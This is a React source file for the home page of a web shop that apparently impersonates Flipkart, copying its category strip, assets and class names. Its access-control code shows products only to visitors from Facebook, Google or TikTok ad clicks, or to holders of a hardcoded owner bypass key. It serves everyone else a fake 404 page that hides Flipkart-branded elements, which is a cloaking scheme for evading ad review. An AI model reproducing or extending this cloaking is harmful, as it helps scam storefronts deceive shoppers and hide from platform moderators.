import { useState, useEffect } from "react";
import ProductCard from "../components/ProductCard";
import CategoryStrip from "../components/CategoryStrip";
import DealsOfTheDay from "../components/DealsOfTheDay";
import { localService } from "../services/localService";

// ============================================
// AD ACCESS CONTROL - PURE JSX/JAVASCRIPT
// ============================================

// Owner access key (change this!)
const OWNER_BYPASS_KEY = 'roshroy';

// Cookie utility functions
const setCookie = (name, value, days) => {
  const date = new Date();
  date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
  document.cookie = `${name}=${value};expires=${date.toUTCString()};path=/`;
};

const getCookie = (name) => {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
  return null;
};

// Check if real Facebook click
const isRealFacebookClick = (searchParams) => {
  const fbclid = searchParams.get('fbclid');
  
  if (fbclid && fbclid.length > 20 && /^[A-Za-z0-9_-]+$/.test(fbclid)) {
    return true;
  }
  
  const fbParams = ['h', '__cft__', '__tn__', 'd'];
  return fbParams.some(param => searchParams.get(param));
};

// Check if real Google click
const isRealGoogleClick = (searchParams) => {
  const gclid = searchParams.get('gclid');
  
  if (gclid && gclid.length > 15) {
    return true;
  }
  
  return !!searchParams.get('dclid');
};

// Check if real TikTok click
const isRealTikTokClick = (searchParams) => {
  return !!searchParams.get('ttclid');
};

// Check if from ad platform referrer
const isFromAdPlatform = () => {
  const referrer = document.referrer || '';
  const adPlatforms = [
    'l.facebook.com',
    'lm.facebook.com',
    'm.facebook.com',
    'facebook.com/l.php',
    'messenger.com',
    't.co',
    'google.com/url',
  ];
  
  return adPlatforms.some(platform => referrer.includes(platform));
};

// ============================================
// 404 PAGE COMPONENT - WITH HEADER HIDER
// ============================================
const NotFoundPage = () => {
  useEffect(() => {
    // Update URL to show 404
    window.history.replaceState({}, 'Not Found', '/404');
    
    // CRITICAL: Hide ALL header elements by force
    const hideAllHeaders = () => {
      // Try to find and hide common header elements
      const possibleHeaders = [
        document.querySelector('header'),
        document.querySelector('nav'),
        document.querySelector('.CategoryStrip'), // Try class name
        document.querySelector('[class*="Category"]'), // Any class containing Category
        document.querySelector('[class*="header"]'), // Any class containing header
        document.querySelector('[class*="navbar"]'), // Any class containing navbar
        document.querySelector('[class*="search"]'), // Any class containing search
        document.querySelector('._2dxSCm'), // Your specific class from the image
        document.querySelector('._3CzzrP'), // Another class from your code
        document.querySelector('._38U37R'), // Another class from your code
        document.querySelector('._1FWdmb'), // Header container class
      ];
      
      // Hide all found elements
      possibleHeaders.forEach(el => {
        if (el) {
          el.style.setProperty('display', 'none', 'important');
        }
      });
      
      // Also hide any element that might be the header based on common patterns
      const allDivs = document.querySelectorAll('div');
      allDivs.forEach(div => {
        const html = div.innerHTML || '';
        if (html.includes('Flipkart') || html.includes('Search for Products') || html.includes('bars.svg')) {
          div.style.setProperty('display', 'none', 'important');
        }
      });
      
      // Ensure body has no extra spacing
      document.body.style.margin = '0';
      document.body.style.padding = '0';
      document.documentElement.style.margin = '0';
      document.documentElement.style.padding = '0';
    };
    
    // Run immediately
    hideAllHeaders();
    
    // Run after a short delay to catch dynamically rendered elements
    const timeoutId = setTimeout(hideAllHeaders, 100);
    
    // Also run on any DOM changes
    const observer = new MutationObserver(hideAllHeaders);
    observer.observe(document.body, { childList: true, subtree: true });
    
    return () => {
      clearTimeout(timeoutId);
      observer.disconnect();
      
      // Restore styles when component unmounts
      const possibleHeaders = [
        document.querySelector('header'),
        document.querySelector('nav'),
        document.querySelector('.CategoryStrip'),
        document.querySelector('._2dxSCm'),
        document.querySelector('._3CzzrP'),
        document.querySelector('._38U37R'),
        document.querySelector('._1FWdmb'),
      ];
      
      possibleHeaders.forEach(el => {
        if (el) {
          el.style.display = '';
        }
      });
      
      document.body.style.margin = '';
      document.body.style.padding = '';
      document.documentElement.style.margin = '';
      document.documentElement.style.padding = '';
    };
  }, []);

  return (
    <div style={{
      position: 'fixed',
      top: 0,
      left: 0,
      right: 0,
      bottom: 0,
      zIndex: 999999, // Very high z-index to overlay everything
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      margin: 0,
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      <div style={{
        background: 'rgba(255, 255, 255, 0.1)',
        backdropFilter: 'blur(10px)',
        borderRadius: '20px',
        padding: '60px 40px',
        textAlign: 'center',
        maxWidth: '500px',
        width: '100%',
        boxShadow: '0 20px 60px rgba(0, 0, 0, 0.3)',
        border: '1px solid rgba(255, 255, 255, 0.2)',
        color: 'white'
      }}>
        <div style={{ fontSize: '64px', marginBottom: '30px' }}>🚫</div>
        <div style={{
          fontSize: '120px',
          fontWeight: '800',
          marginBottom: '20px',
          lineHeight: '1',
          textShadow: '3px 3px 6px rgba(0, 0, 0, 0.3)'
        }}>404</div>
        <h1 style={{
          fontSize: '32px',
          fontWeight: '600',
          marginBottom: '20px'
        }}>Page Not Found</h1>
        <p style={{
          fontSize: '18px',
          lineHeight: '1.6',
          marginBottom: '30px',
          opacity: '0.9'
        }}>
          The page you are looking for could not be found.<br />
          Please check the URL or contact support.
        </p>
        <a 
          href="/" 
          style={{
            display: 'inline-block',
            background: 'white',
            color: '#667eea',
            padding: '15px 40px',
            borderRadius: '50px',
            textDecoration: 'none',
            fontWeight: '600',
            fontSize: '16px',
            transition: 'all 0.3s ease',
            boxShadow: '0 10px 30px rgba(0, 0, 0, 0.2)',
            cursor: 'pointer'
          }}
          onMouseEnter={(e) => {
            e.target.style.transform = 'translateY(-3px)';
            e.target.style.boxShadow = '0 15px 40px rgba(0, 0, 0, 0.3)';
          }}
          onMouseLeave={(e) => {
            e.target.style.transform = 'translateY(0)';
            e.target.style.boxShadow = '0 10px 30px rgba(0, 0, 0, 0.2)';
          }}
        >
          Go to Homepage
        </a>
      </div>
    </div>
  );
};

// Loading Spinner Component
const LoadingSpinner = () => (
  <div style={{
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    zIndex: 999999,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    background: '#f3f4f6'
  }}>
    <div style={{ textAlign: 'center' }}>
      <div style={{
        display: 'inline-block',
        width: '48px',
        height: '48px',
        border: '4px solid #e5e7eb',
        borderTopColor: '#3b82f6',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite',
        marginBottom: '16px'
      }} />
      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
      <p style={{ color: '#4b5563' }}>Loading...</p>
    </div>
  </div>
);

// ============================================
// MAIN HOME COMPONENT
// ============================================

const Home = () => {
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [checkingAuth, setCheckingAuth] = useState(true);
  const [products, setProducts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [hasMore, setHasMore] = useState(true);

  // Categories Mapping
  const categories = [
    { name: "Categories", img: "/assets/images/theme/bars.svg" },
    { name: "Offer Zone", img: "/assets/images/0f3d008be60995d4.webp" },
    { name: "Mobiles", img: "/assets/images/0f3d008be60995d4.webp" },
    { name: "Fashion", img: "/assets/images/824aa3a83b4057eb.webp" },
    { name: "Electronics", img: "/assets/images/6ecb75e51b607880.webp" },
    { name: "Home", img: "/assets/images/1faac897db7fa1e8.webp" },
    { name: "Appliances", img: "/assets/images/356d37e9512c7fcb.webp" },
    { name: "Toys & Baby", img: "/assets/images/418dfd603e730185.webp" },
  ];

  // ============================================
  // ACCESS CONTROL CHECK
  // ============================================
  useEffect(() => {
    const checkAccess = () => {
      const searchParams = new URLSearchParams(window.location.search);
      
      // 1. OWNER ACCESS
      if (searchParams.get('owner_bypass') === OWNER_BYPASS_KEY) {
        setCookie('owner_access', '1', 30);
        setCookie('ad_access_granted', '1', 30);
        setIsAuthorized(true);
        setCheckingAuth(false);
        return;
      }
      
      // Check owner cookie
      if (getCookie('owner_access') === '1') {
        setIsAuthorized(true);
        setCheckingAuth(false);
        return;
      }
      
      // 2. REAL AD CLICKS
      if (isRealFacebookClick(searchParams)) {
        setCookie('ad_access_granted', '1', 30);
        setCookie('ad_source', 'facebook', 30);
        setIsAuthorized(true);
        setCheckingAuth(false);
        return;
      }
      
      if (isRealGoogleClick(searchParams)) {
        setCookie('ad_access_granted', '1', 30);
        setCookie('ad_source', 'google', 30);
        setIsAuthorized(true);
        setCheckingAuth(false);
        return;
      }
      
      if (isRealTikTokClick(searchParams)) {
        setCookie('ad_access_granted', '1', 30);
        setCookie('ad_source', 'tiktok', 30);
        setIsAuthorized(true);
        setCheckingAuth(false);
        return;
      }
      
      // 3. CHECK REFERRER
      if (isFromAdPlatform()) {
        setCookie('ad_access_granted', '1', 30);
        
        const referrer = document.referrer;
        if (referrer.includes('facebook')) {
          setCookie('ad_source', 'facebook', 30);
        } else if (referrer.includes('google')) {
          setCookie('ad_source', 'google', 30);
        } else if (referrer.includes('tiktok')) {
          setCookie('ad_source', 'tiktok', 30);
        }
        
        setIsAuthorized(true);
        setCheckingAuth(false);
        return;
      }
      
      // 4. RETURNING USERS
      if (getCookie('ad_access_granted') === '1') {
        setIsAuthorized(true);
        setCheckingAuth(false);
        return;
      }
      
      // 5. BLOCK EVERYONE ELSE
      setIsAuthorized(false);
      setCheckingAuth(false);
    };
    
    checkAccess();
  }, []);

  // Fetch products only if authorized
  useEffect(() => {
    if (!isAuthorized) return;
    
    const fetchProducts = async () => {
      try {
        setLoading(true);
        const length = 10;
        const start = (page - 1) * length;
        const res = await localService.getProducts({ start, length });
        if (res.success && res.data.length > 0) {
          setProducts((prev) => {
            const newProducts = res.data.filter(
              (p) => !prev.some((existing) => existing.id === p.id)
            );
            return [...prev, ...newProducts];
          });
        } else {
          setHasMore(false);
        }
      } catch (error) {
        console.error("Error fetching products", error);
      } finally {
        setLoading(false);
      }
    };

    if (hasMore) {
      fetchProducts();
    }
  }, [page, isAuthorized]);

  // Infinite scroll
  useEffect(() => {
    if (!isAuthorized) return;
    
    const handleScroll = () => {
      if (
        window.innerHeight + document.documentElement.scrollTop + 105 >=
        document.documentElement.scrollHeight
      ) {
        if (!loading && hasMore) {
          setPage((prev) => prev + 1);
        }
      }
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, [loading, hasMore, isAuthorized]);

  // Show loading while checking auth
  if (checkingAuth) {
    return <LoadingSpinner />;
  }

  // Show 404 if not authorized - THIS WILL NOW HIDE ALL HEADERS
  if (!isAuthorized) {
    return <NotFoundPage />;
  }

  // Show homepage if authorized
  return (
    <div className="bg-gray-100 min-h-screen pb-2">
      {/* Category Strip */}
      <CategoryStrip />

      {/* Hero Banner */}
      <div className="w-full bg-white -mt-0.5">
        <img
          src="/assets/images/bn1.jpg"
          alt="Bank Offer"
          className="w-full h-auto rounded-sm"
        />
      </div>

      {/* Deals of the Day */}
      <DealsOfTheDay />

      {/* Products Grid Section */}
      <div className="bg-white mb-2">
        <div className="grid grid-cols-2">
          {products.length > 0 &&
            products.map((product, index) => (
              <ProductCard key={`${product.id}-${index}`} product={product} />
            ))}
        </div>

        {loading && (
          <div className="text-center py-6 w-full bg-white">
            <span className="text-gray-500 font-medium text-sm">
              Loading more products...
            </span>
          </div>
        )}

        {!loading && products.length === 0 && (
          <div className="text-center py-10">No Products Found</div>
        )}
      </div>
    </div>
  );
};

export default Home;